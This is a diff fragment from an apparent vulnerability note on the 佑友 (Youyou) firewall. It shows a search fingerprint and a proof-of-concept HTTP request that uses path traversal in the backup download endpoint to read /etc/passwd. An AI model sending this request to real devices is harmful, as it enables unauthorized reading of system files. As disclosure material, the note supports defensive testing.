@@ -8,7 +8,7 @@
 title=”佑友防火墙”
 ```
 
-## poc
+## POC
 
 ```
 GET /index.php?c=backup&a=download&file=../../../../etc/passwd HTTP/1.1
